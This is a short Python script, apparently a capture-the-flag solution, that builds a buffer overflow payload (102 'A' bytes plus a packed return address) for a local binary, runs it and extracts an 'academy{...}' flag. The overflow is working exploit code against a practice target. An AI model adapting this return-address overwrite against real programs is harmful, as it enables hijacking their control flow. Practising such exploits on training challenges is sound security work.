import struct, sys, subprocess, re

stream = open('/tmp/bizz_stream.bin', 'rb').read()
assert stream.endswith(b"x\n"), stream[-10:]
head = stream[:-2]                      # retire le dernier 'x\n'
# scanf("%7s") consomme "x", laisse " " puis la ligne du fgets
line = b" " + b"A" * 102 + struct.pack("<I", 0x8049206) + b"\n"
inp = head + b"x" + line
open('/tmp/bizz_in.bin', 'wb').write(inp)
print("input bytes:", len(inp), "head:", len(head), "line:", len(line))
p = subprocess.run(["./_z_bizz"], input=inp, capture_output=True, timeout=60)
out = p.stdout
print("rc:", p.returncode, "stdout len:", len(out))
print("tail:", out[-200:])
m = re.search(rb"academy\{[^}]*\}", out)
print("FLAG:", m.group(0).decode() if m else None)
